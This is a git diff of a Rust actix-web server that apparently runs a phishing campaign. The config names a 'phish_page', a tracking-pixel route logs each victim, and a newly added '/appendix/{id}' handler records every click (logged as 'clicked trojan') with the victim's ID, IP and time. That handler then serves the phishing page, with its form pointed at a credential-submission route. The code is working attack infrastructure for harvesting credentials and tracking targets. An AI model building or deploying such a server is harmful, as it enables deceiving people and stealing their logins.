@@ -1,18 +1,16 @@
 use actix_web::{http::StatusCode, post, web, App, HttpRequest, HttpResponse, HttpServer, Responder, ResponseError, Result, cookie::Key};
+use serde::Deserialize;
 use actix_cors::Cors;
 use std::io;
 use std::env;
 use actix_web::middleware::Logger;
 use std::sync::{Arc, Mutex};
-// use once_cell::sync::Lazy;
 use sled;
 use chrono::{Utc, FixedOffset};
 use std::fs;
-use {
-    zerocopy::{
+use zerocopy::{
         AsBytes, LayoutVerified, U16, U32, FromBytes, Unaligned
-    },
-};
+    };
 
 // use rustls_pemfile::{certs, pkcs8_private_keys};
 // use rustls::{ pki_types::PrivateKeyDer, ServerConfig };
@@ -20,9 +18,34 @@ use {
 mod db;
 
 use db::*;
-use common::structs::*;
-use common::utils::*;
+use shared::structs::*;
+use shared::utils::*;
 
+#[derive(Debug, Clone, Deserialize)]
+pub struct ServerConfig {
+    pub server: Server,
+    pub paths: Paths,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+pub struct Server {
+    pub ip: String,
+    pub port: u16,
+}
+
+#[derive(Debug, Clone, Deserialize)]
+pub struct Paths {
+    pub phish_page: String,
+    pub redirect_url: String,
+    pub success_page: String,
+}
+
+impl ServerConfig {
+    pub fn load() -> Result<Self, Box<dyn std::error::Error>> {
+        let content = fs::read_to_string("server_config.toml")?;
+        Ok(toml::from_str(&content)?)
+    }
+} 
 
 #[derive(Debug)]
 struct AppState {
@@ -31,14 +54,13 @@ struct AppState {
 
 #[actix_web::main]
 async fn main() -> io::Result<()> {
-    // 1. 环境变量和日志初始化
     unsafe {
         env::set_var("RUST_LOG", "info");
     }
 
     env_logger::init_from_env(env_logger::Env::new().default_filter_or("info"));
     
-    // 2. 数据库初始化
+    // 数据库初始化
     let db = sled::open("database").map_err(|e| {
         log::error!("Failed to open database: {}", e);
         io::Error::new(io::ErrorKind::Other, "Database initialization failed")
@@ -54,9 +76,9 @@ async fn main() -> io::Result<()> {
         io::Error::new(io::ErrorKind::Other, "Data tree initialization failed")
     })?);
 
-    // 3. 配置加载
-    let config = Config::load().map_err(|e| {
-        log::error!("Failed to load config: {}", e);
+    // 配置加载
+    let config = ServerConfig::load().map_err(|e| {
+        log::error!("Failed to load server_config: {}", e);
         io::Error::new(io::ErrorKind::Other, "Configuration loading failed")
     })?;
     
@@ -66,6 +88,7 @@ async fn main() -> io::Result<()> {
     let index_path = "/index/{id}";
     let submit_path = "/submit/{id}";
     let image_path = "/image/{id}";
+    let appendix_path = "/appendix/{id}";
 
     // 4. 服务器启动
     HttpServer::new(move || {
@@ -79,6 +102,7 @@ async fn main() -> io::Result<()> {
             .route(&submit_path, web::post().to(handle_post))
             .route(&index_path, web::get().to(handle_index))
             .route(&image_path, web::get().to(handle_image))
+            .route(&appendix_path, web::get().to(handle_appendix))
             .route("/success", web::get().to(handle_success))
     })
     .bind(&bind_addr).map_err(|e| {
@@ -93,7 +117,7 @@ async fn main() -> io::Result<()> {
 async fn handle_index(
     req: HttpRequest, 
     action_tree: web::Data<ActionTree>,
-    config: web::Data<Config>
+    config: web::Data<ServerConfig>
 ) -> HttpResponse {
     // 从URL路径中提取ID
     let user_id = req.match_info()
@@ -161,7 +185,7 @@ async fn handle_post(
     form: web::Bytes,
     action_tree: web::Data<ActionTree>,
     data_tree: web::Data<DataTree>,
-    config: web::Data<Config>
+    config: web::Data<ServerConfig>
 ) -> HttpResponse {
     let connection_info = req.connection_info();
     let peer_addr = connection_info.peer_addr().unwrap_or("unknown");
@@ -273,7 +297,7 @@ async fn handle_post(
 async fn handle_image(
     req: HttpRequest, 
     action_tree: web::Data<ActionTree>,
-    config: web::Data<Config>
+    config: web::Data<ServerConfig>
 ) -> HttpResponse {
     // 从URL路径中提取ID
     let user_id = req.match_info()
@@ -337,8 +361,74 @@ async fn handle_image(
         .body(transparent_pixel)
 }
 
+async fn handle_appendix(
+    req: HttpRequest, 
+    action_tree: web::Data<ActionTree>,
+    config: web::Data<ServerConfig>
+) -> HttpResponse {
+    // 从URL路径中提取ID
+    let user_id = req.match_info()
+        .get("id")
+        .unwrap_or("None");
+
+    let connection_info = req.connection_info();
+    let peer_addr = connection_info.peer_addr().unwrap_or("unknown");
+
+    let timestamp = Utc::now();
+    let china_offset = FixedOffset::east_opt(8 * 3600)
+        .ok_or_else(|| {
+            log::error!("Failed to create timezone offset");
+            "Invalid timezone offset"
+        })
+        .unwrap_or(FixedOffset::east_opt(0).unwrap());
+    let timestamp_china = timestamp.with_timezone(&china_offset).to_rfc3339();
+
+    let log_entry = format!("点击木马： Time: {}, IP: {}, ID: {}", timestamp_china, peer_addr, user_id);
+    log::info!("{}", log_entry);
+
+    // 处理数据库操作
+    let newid = match get_next_id_for_tree(&action_tree.get_tree()) {
+        Ok(id) => U16::new(id),
+        Err(e) => {
+            log::error!("Failed to get next ID: {}", e);
+            return HttpResponse::InternalServerError().body("Server error");
+        }
+    };
+
+    let action = Action { 
+        id: newid,
+        user_id: string_to_u8_4_gbk(user_id),
+        time: string_to_u8_32_gbk(&timestamp_china), 
+        ip: string_to_u8_32_gbk(peer_addr), 
+        atype: U16::new(3), 
+        data_id: U16::new(0)
+    };
+
+    match create_action(&action_tree.get_tree(), action){
+        Ok(_) => {
+            log::info!("Actions写入数据库成功");
+        },
+        Err(_) =>{
+            log::error!("Actions写入数据库失败");
+        }
+    }
+
+    // 读取页面文件
+    match fs::read_to_string(&config.paths.phish_page) {
+        Ok(content) => {
+            let content = content.replace("{{submit}}", &format!("/submit/{}", user_id));
+
+            HttpResponse::Ok().content_type("text/html").body(content)
+        },
+        Err(e) => {
+            log::error!("Failed to read phish page: {}", e);
+            HttpResponse::InternalServerError().body("Error loading page")
+        }
+    }
+}
+
 async fn handle_success(
-    config: web::Data<Config>
+    config: web::Data<ServerConfig>
 ) -> HttpResponse {
     match fs::read_to_string(&config.paths.success_page) {
         Ok(content) => HttpResponse::Ok().content_type("text/html").body(content),
